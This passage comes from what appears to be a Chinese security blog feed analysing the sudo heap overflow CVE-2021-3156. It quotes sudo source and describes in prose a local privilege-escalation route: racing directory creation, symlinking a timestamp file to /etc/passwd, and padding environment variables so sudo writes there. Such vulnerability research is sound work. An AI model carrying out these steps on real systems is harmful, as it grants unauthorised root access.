SUDOERS_DEBUG_AUTH)</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* umask must not be more restrictive than the file modes. */</span></span><br><span class="line">    omask = umask(ACCESSPERMS &amp; ~(mode|parent_mode));</span><br><span class="line">    ret = sudo_mkdir_parents(path, owner, group, parent_mode, quiet);</span><br><span class="line">    <span class="keyword">if</span> (ret) &#123;</span><br><span class="line"><span class="comment">/* Create final path component. */</span></span><br><span class="line">sudo_debug_printf(SUDO_DEBUG_DEBUG|SUDO_DEBUG_LINENO,</span><br><span class="line">    <span class="string">"mkdir %s, mode 0%o, uid %d, gid %d"</span>, path, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)mode,</span><br><span class="line">    (<span class="keyword">int</span>)owner, (<span class="keyword">int</span>)group);</span><br><span class="line"><span class="keyword">if</span> (mkdir(path, mode) != <span class="number">0</span> &amp;&amp; errno != EEXIST) &#123; <span class="comment">//[3]</span></span><br><span class="line">    <span class="keyword">if</span> (!quiet)</span><br><span class="line">sudo_warn(U_(<span class="string">"unable to mkdir %s"</span>), path);</span><br><span class="line">    ret = <span class="literal">false</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (chown(path, owner, group) != <span class="number">0</span>) &#123; <span class="comment">//[4]</span></span><br><span class="line">sudo_debug_printf(SUDO_DEBUG_ERROR|SUDO_DEBUG_ERRNO,</span><br><span class="line">    <span class="string">"%s: unable to chown %d:%d %s"</span>, __func__,</span><br><span class="line">    (<span class="keyword">int</span>)owner, (<span class="keyword">int</span>)group, path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    umask(omask);</span><br><span class="line">    debug_return_bool(ret);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有四步蛮重要的</p><p>第一步检测路径和权限，这时候让它不存在，进入[2]</p><p>然后在[3]里面会创建 文件夹，这时候我们race，自己创建一个文件夹，然后mkdir就报错，如果我们不自己创建文件夹，那么这时候问题就大了，sudo程序创建的这个目录是root，我们无法访问，接下来也莫得办法。</p><p>创建的时间在 [2] [3] 之间应该都可，然后到[4] 这时候，如果让它执行成，那就等于，前面[3] sudo程序mkdir成功了，那肯定不能让它成功，这时候就得删除掉这个文件夹，然后chown就会报错，但是不影响返回值</p><p>然后这里就绕过了 这个 ts_secure_dir 成功走到 timestamp_open的下面</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/* Open time stamp file. */</span></span><br><span class="line">    <span class="keyword">if</span> (asprintf(&amp;fname, <span class="string">"%s/%s"</span>, def_timestampdir, user) == <span class="number">-1</span>) &#123; <span class="comment">//[1]</span></span><br><span class="line">sudo_warnx(U_(<span class="string">"%s: %s"</span>), __func__, U_(<span class="string">"unable to allocate memory"</span>));</span><br><span class="line"><span class="keyword">goto</span> bad;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (tries = <span class="number">1</span>; ; tries++) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">sb</span>;</span></span><br><span class="line"><span class="comment">// 上面能看到 (asprintf(&amp;fname, "%s/%s", def_timestampdir, user)  这个是配置 stampfile的文件名字的</span></span><br><span class="line">fd = ts_open(fname, O_RDWR|O_CREAT); <span class="comment">//[2]</span></span><br><span class="line"><span class="keyword">switch</span> (fd) &#123;</span><br><span class="line"><span class="keyword">case</span> TIMESTAMP_OPEN_ERROR:</span><br><span class="line">    log_warning(SLOG_SEND_MAIL, N_(<span class="string">"unable to open %s"</span>), fname);</span><br><span class="line">    <span class="keyword">goto</span> bad;</span><br><span class="line"><span class="keyword">case</span> TIMESTAMP_PERM_ERROR:</span><br><span class="line">    <span class="comment">/* Already logged set_perms/restore_perms error. */</span></span><br><span class="line">    <span class="keyword">goto</span> bad;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Remove time stamp file if its mtime predates boot time. */</span></span><br><span class="line"><span class="keyword">if</span> (tries == <span class="number">1</span> &amp;&amp; fstat(fd, &amp;sb) == <span class="number">0</span>) &#123; <span class="comment">//[3]</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">boottime</span>, <span class="title">mtime</span>, <span class="title">now</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sudo_gettime_real(&amp;now) == <span class="number">0</span> &amp;&amp; get_boottime(&amp;boottime)) &#123;</span><br><span class="line"><span class="comment">/* Ignore a boot time that is in the future. */</span></span><br><span class="line"><span class="keyword">if</span> (sudo_timespeccmp(&amp;now, &amp;boottime, &lt;)) &#123;</span><br><span class="line">    sudo_debug_printf(SUDO_DEBUG_WARN|SUDO_DEBUG_LINENO,</span><br><span class="line"><span class="string">"ignoring boot time that is in the future"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    mtim_get(&amp;sb, mtime);</span><br><span class="line">    <span class="keyword">if</span> (sudo_timespeccmp(&amp;mtime, &amp;boottime, &lt;)) &#123;</span><br><span class="line"><span class="comment">/* Time stamp file too old, remove it. */</span></span><br><span class="line">sudo_debug_printf(SUDO_DEBUG_WARN|SUDO_DEBUG_LINENO,</span><br><span class="line">    <span class="string">"removing time stamp file that predates boot time"</span>);</span><br><span class="line">close(fd);</span><br><span class="line">unlink(fname); <span class="comment">//[4]</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Allocate and fill in cookie to store state. */</span></span><br><span class="line">    cookie = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(*cookie));</span><br><span class="line">    <span class="keyword">if</span> (cookie == <span class="literal">NULL</span>) &#123;</span><br><span class="line">sudo_warnx(U_(<span class="string">"%s: %s"</span>), __func__, U_(<span class="string">"unable to allocate memory"</span>));</span><br><span class="line"><span class="keyword">goto</span> bad;</span><br><span class="line">    &#125;</span><br><span class="line">    cookie-&gt;fd = fd;</span><br><span class="line">    cookie-&gt;fname = fname;</span><br><span class="line">    cookie-&gt;sid = sid;</span><br><span class="line">    cookie-&gt;pos = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    debug_return_ptr(cookie);</span><br><span class="line">bad:</span><br><span class="line">    <span class="keyword">if</span> (fd != <span class="number">-1</span>)</span><br><span class="line">close(fd);</span><br><span class="line">    <span class="built_in">free</span>(fname);</span><br><span class="line">    debug_return_ptr(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这时候 就到了 [1] 组装文件名字和路径的时候了，然后[2] open,我们得在这个open和前面的chown之间 创建回来这个文件夹，和我们设置的链接，才能open成功，举个例子来作为open的说明</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">obigchungussssssssssss000000000000000000000000000000000000000000000000000000000001/yezi</span><br><span class="line">yezi软链接到 /etc/passwd</span><br><span class="line"></span><br><span class="line">建议创建的是 777的文件夹权限</span><br></pre></td></tr></table></figure><p>这个就是我创建的文件夹和名字，然后open完，进入到下面的时间戳检测，因为passwd 的确比机器启动的时候还早，所以会进入到 [4],这个时候这个文件会给删除掉了，明明我创建的 obigchungussssssssssss000000000000000000000000000000000000000000000000000000000001/yezi</p><p>这个文件要比 boottime要晚，为啥 会是passwd的时间呢，因为这里用到fstat，它如果用在软连接的文件上，就会获取到软连接到的程序上，所以比boottine还早，但是呢这里的进入条件是 tries == 1 第二次就进不来了，所以我再创建一次就OK了，然后这个 timestamp_open 就成功打开了 我们控制的 symlink</p><p>下面就到了 timestamp_lock 函数 ，这个函数可以写东西进去</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span></span><br><span class="line">timestamp_lock(<span class="keyword">void</span> *vcookie, struct passwd *pw)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ts_cookie</span> *<span class="title">cookie</span> = <span class="title">vcookie</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timestamp_entry</span> <span class="title">entry</span>;</span></span><br><span class="line">    <span class="keyword">off_t</span> lock_pos;</span><br><span class="line">    <span class="keyword">ssize_t</span> nread;</span><br><span class="line">    debug_decl(timestamp_lock, SUDOERS_DEBUG_AUTH)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cookie == <span class="literal">NULL</span>) &#123;</span><br><span class="line">sudo_debug_printf(SUDO_DEBUG_DEBUG|SUDO_DEBUG_LINENO,</span><br><span class="line">    <span class="string">"called with a NULL cookie!"</span>);</span><br><span class="line">debug_return_bool(<span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Take a lock on the "write" record (the first record in the file).</span></span><br><span class="line"><span class="comment">     * This will let us seek for the record or extend as needed</span></span><br><span class="line"><span class="comment">     * without colliding with anyone else.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (!timestamp_lock_record(cookie-&gt;fd, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct timestamp_entry)))</span><br><span class="line">debug_return_bool(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Make sure the first record is of type TS_LOCKEXCL. */</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;entry, <span class="number">0</span>, <span class="keyword">sizeof</span>(entry)); </span><br><span class="line">    nread = read(cookie-&gt;fd, &amp;entry, <span class="keyword">sizeof</span>(entry));<span class="comment">//[1]</span></span><br><span class="line">    <span class="keyword">if</span> (nread == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">/* New file, add TS_LOCKEXCL record. */</span></span><br><span class="line">entry.version = TS_VERSION;</span><br><span class="line">entry.size = <span class="keyword">sizeof</span>(entry);</span><br><span class="line">entry.type = TS_LOCKEXCL;</span><br><span class="line"><span class="keyword">if</span> (ts_write(cookie-&gt;fd, cookie-&gt;fname, &amp;entry, <span class="number">-1</span>) == <span class="number">-1</span>)<span class="comment">//[2]</span></span><br><span class="line">    debug_return_bool(<span class="literal">false</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (entry.type != TS_LOCKEXCL) &#123;</span><br><span class="line"><span class="comment">/* Old sudo record, convert it to TS_LOCKEXCL. */</span></span><br><span class="line"> *************</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">static</span> <span class="keyword">ssize_t</span></span><br><span class="line">ts_write(<span class="keyword">int</span> fd, <span class="keyword">const</span> <span class="keyword">char</span> *fname, struct timestamp_entry *entry, <span class="keyword">off_t</span> offset)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">ssize_t</span> nwritten;</span><br><span class="line">    <span class="keyword">off_t</span> old_eof;</span><br><span class="line">    debug_decl(ts_write, SUDOERS_DEBUG_AUTH)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (offset == <span class="number">-1</span>) &#123;</span><br><span class="line">old_eof = lseek(fd, <span class="number">0</span>, SEEK_CUR);</span><br><span class="line">nwritten = write(fd, entry, entry-&gt;size);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">old_eof = offset;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_PWRITE</span></span><br><span class="line">nwritten = pwrite(fd, entry, entry-&gt;size, offset);<span class="comment">//[3]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="keyword">if</span> (lseek(fd, offset, SEEK_SET) == <span class="number">-1</span>) &#123;</span><br><span class="line">    sudo_debug_printf(SUDO_DEBUG_ERROR|SUDO_DEBUG_ERRNO|SUDO_DEBUG_LINENO,</span><br><span class="line"><span class="string">"unable to seek to %lld"</span>, (<span class="keyword">long</span> <span class="keyword">long</span>)offset);</span><br><span class="line">    nwritten = <span class="number">-1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    nwritten = write(fd, entry, entry-&gt;size);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">size_t</span>)nwritten != entry-&gt;size) &#123;<span class="comment">//[4]</span></span><br><span class="line"><span class="keyword">if</span> (nwritten == <span class="number">-1</span>) &#123;</span><br><span class="line">    log_warning(SLOG_SEND_MAIL,</span><br><span class="line">N_(<span class="string">"unable to write to %s"</span>), fname);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    log_warningx(SLOG_SEND_MAIL,</span><br><span class="line">N_(<span class="string">"unable to write to %s"</span>), fname);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Truncate on partial write to be safe (assumes end of file). */</span></span><br><span class="line"><span class="keyword">if</span> (nwritten &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    sudo_debug_printf(SUDO_DEBUG_DEBUG|SUDO_DEBUG_LINENO,</span><br><span class="line"><span class="string">"short write, truncating partial time stamp record"</span>);</span><br><span class="line">    <span class="keyword">if</span> (ftruncate(fd, old_eof) != <span class="number">0</span>) &#123;</span><br><span class="line">sudo_warn(U_(<span class="string">"unable to truncate time stamp file to %lld bytes"</span>),</span><br><span class="line">    (<span class="keyword">long</span> <span class="keyword">long</span>)old_eof);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">debug_return_ssize_t</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">debug_return_ssize_t</span>(nwritten);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里到 [1] 处，因为我们的/etc/passwd肯定不是空的，所以进入到[2]，然后在[2] 里面主要一点，不然就是算写入了，也得被清空</p><p>主要[4]的位置有一个 检测写入size，那算，写入的size要等于那个，那就得在环境变量里面多加很多多余的数据来填充</p><p><img src="/images/image-20210208155841874.png" alt="image-20210208155841874"></p><p>整个大概的利用过程就这样</p><p><img src="/images/image-20210208155922200.png" alt="image-20210208155922200"></p><p>参考链接</p><p><a href="https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt" target="_blank" rel="noopener">1</a></p><p><a href="https://github.com/stong/CVE-2021-3156" target="_blank" rel="noopener">stong</a></p>]]></content>
    
    <summary type="html">
    
      &lt;center&gt;&lt;font size=&quot;5&quot;&gt;info&lt;/font&gt;&lt;/center&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="https://leave-Devour.github.io/categories/pwn/"/>
    
    
      <category term="CVE" scheme="https://leave-Devour.github.io/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-3165_第二种方法</title>
    <link href="https://leave-devour.github.io/2021/02/21/CVE-2021-3165-%E7%AC%AC%E4%BA%8C%E7%A7%8D%E6%96%B9%E6%B3%95/"/>
    <id>https://leave-devour.github.io/2021/02/21/CVE-2021-3165-%E7%AC%AC%E4%BA%8C%E7%A7%8D%E6%96%B9%E6%B3%95/</id>
    <published>2021-02-21T02:38:44.000Z</published>
    <updated>2021-02-23T12:23:09.859Z</updated>
    
    <content type="html"><![CDATA[<center><font size="5">info</font></center><a id="more"></a><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞存在位置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * When running a command via a shell, the sudo front-end</span></span><br><span class="line"><span class="comment"> * escapes potential meta chars.  We unescape non-spaces</span></span><br><span class="line"><span class="comment"> * for sudoers matching and logging purposes.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">for</span> (to = user_args, av = NewArgv + <span class="number">1</span>; (from = *av); av++) &#123;</span><br><span class="line">    <span class="keyword">while</span> (*from) &#123;</span><br><span class="line"><span class="keyword">if</span> (from[<span class="number">0</span>] == <span class="string">'\\'</span> &amp;&amp; !<span class="built_in">isspace</span>((<span class="keyword">unsigned</span> <span class="keyword">char</span>)from[<span class="number">1</span>]))</span><br><span class="line">    from++;</span><br><span class="line">*to++ = *from++;</span><br><span class="line">    &#125;</span><br><span class="line">    *to++ = <span class="string">' '</span>;</span><br><span class="line">&#125;</span><br><span class="line">*--to = <span class="string">'\0'</span>;</span><br></pre></td></tr></table></figure><p>这个怎么说呢 </p><p>首先 这里的 NewArgv 就是 命令行传进去的参数 比如  sudo  aaaaaa bbbbbb eeeeeeeee cccc</p><p>这里 就会分开 变成一个二维数组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">NewArgv[][]=&#123;aaaaaaa</span><br><span class="line"></span><br><span class="line">bbbbbb</span><br><span class="line"></span><br><span class="line">eeeeee</span><br><span class="line"></span><br><span class="line">ccccccc&#125;</span><br></pre></td></tr></table></figure><p>所以这里代码就是拷贝 而 NewArgv 里面的内容 就是 地址，但是这些数据 比如 aaaaaa bbbb 都是以 <code>\x00</code> 结尾的，正常的复制，是没什么问题</p><p>但是 如果 这时候 存在一个 <code>\</code> </p><p>这时候 会进入</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (from[<span class="number">0</span>] == <span class="string">'\\'</span> &amp;&amp; !<span class="built_in">isspace</span>((<span class="keyword">unsigned</span> <span class="keyword">char</span>)from[<span class="number">1</span>])) [<span class="number">1</span>]</span><br><span class="line">    from++; [<span class="number">2</span>]</span><br><span class="line">*to++ = *from++; [<span class="number">3</span>]</span><br></pre></td></tr></table></figure><p>在 [1]的时候 会进入到if里面</p><p>然后 from 就会往前走一个byte，然后这时候 from 就会执行 <code>\x00</code> ,然后拷贝了，再往前走，这时候就会越界访问到下个 参数的内存了</p><p>但是这个设计是为什么存在呢 ，其实 是因为 一般情况下 命令的参数 除了 <code>-</code> <code>_</code> <code>$</code> 都会转义</p><p>具体在下面</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> (ISSET(mode, MODE_RUN) &amp;&amp; ISSET(flags, MODE_SHELL)) &#123;</span><br><span class="line"><span class="keyword">char</span> **av, *cmnd = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> ac = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">/* shell -c "command" */</span></span><br><span class="line">    <span class="keyword">char</span> *src, *dst;</span><br><span class="line">    <span class="keyword">size_t</span> cmnd_size = (<span class="keyword">size_t</span>) (argv[argc - <span class="number">1</span>] - argv[<span class="number">0</span>]) +</span><br><span class="line"><span class="built_in">strlen</span>(argv[argc - <span class="number">1</span>]) + <span class="number">1</span>; <span class="comment">// size+1</span></span><br><span class="line"></span><br><span class="line">    cmnd = dst = reallocarray(<span class="literal">NULL</span>, cmnd_size, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (cmnd == <span class="literal">NULL</span>)</span><br><span class="line">sudo_fatalx(U_(<span class="string">"%s: %s"</span>), __func__, U_(<span class="string">"unable to allocate memory"</span>));</span><br><span class="line">    <span class="keyword">if</span> (!gc_add(GC_PTR, cmnd))</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (av = argv; *av != <span class="literal">NULL</span>; av++) &#123;</span><br><span class="line"><span class="keyword">for</span> (src = *av; *src != <span class="string">'\0'</span>; src++) &#123;</span><br><span class="line">    <span class="comment">/* quote potential meta characters */</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">isalnum</span>((<span class="keyword">unsigned</span> <span class="keyword">char</span>)*src) &amp;&amp; *src != <span class="string">'_'</span> &amp;&amp; *src != <span class="string">'-'</span> &amp;&amp; *src != <span class="string">'$'</span>)</span><br><span class="line">*dst++ = <span class="string">'\\'</span>;  <span class="comment">// 转义</span></span><br><span class="line">    *dst++ = *src;</span><br><span class="line">&#125;</span><br><span class="line">*dst++ = <span class="string">' '</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (cmnd != dst)</span><br><span class="line">dst--;  <span class="comment">/* replace last space with a NUL */</span></span><br><span class="line">    *dst = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">    ac += <span class="number">2</span>; <span class="comment">/* -c cmnd */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">av = reallocarray(<span class="literal">NULL</span>, ac + <span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="keyword">char</span> *));</span><br><span class="line"><span class="keyword">if</span> (av == <span class="literal">NULL</span>)</span><br><span class="line">    sudo_fatalx(U_(<span class="string">"%s: %s"</span>), __func__, U_(<span class="string">"unable to allocate memory"</span>));</span><br><span class="line"><span class="keyword">if</span> (!gc_add(GC_PTR, av))</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">av[<span class="number">0</span>] = (<span class="keyword">char</span> *)user_details.shell; <span class="comment">/* plugin may override shell */</span></span><br><span class="line"><span class="keyword">if</span> (cmnd != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    av[<span class="number">1</span>] = <span class="string">"-c"</span>;</span><br><span class="line">    av[<span class="number">2</span>] = cmnd;</span><br><span class="line">&#125;</span><br><span class="line">av[ac] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">argv = av;</span><br><span class="line">argc = ac;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>但是 要进入这里有满足 两个mode 一个 MODE_RUN 另一个是 MODE_SHELL</p><p>先说下 MODE_RUN的set</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((ch = getopt_long(argc, argv, short_opts, long_opts, <span class="literal">NULL</span>)) != <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (ch) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'A'</span>:</span><br><span class="line">    SET(tgetpass_flags, TGP_ASKPASS);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_BSD_AUTH_H</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">'a'</span>:</span><br><span class="line">    assert(optarg != <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (*optarg == <span class="string">'\0'</span>)</span><br><span class="line">usage(<span class="number">1</span>);</span><br><span class="line">    sudo_settings[ARG_BSDAUTH_TYPE].value = optarg;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">************************************</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    argc -= optind;</span><br><span class="line">    argv += optind;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!mode) &#123;</span><br><span class="line"><span class="comment">/* Defer -k mode setting until we know whether it is a flag or not */</span></span><br><span class="line"><span class="keyword">if</span> (sudo_settings[ARG_IGNORE_TICKET].value != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">0</span> &amp;&amp; !(flags &amp; (MODE_SHELL|MODE_LOGIN_SHELL))) &#123;</span><br><span class="line">mode = MODE_INVALIDATE;<span class="comment">/* -k by itself */</span></span><br><span class="line">sudo_settings[ARG_IGNORE_TICKET].value = <span 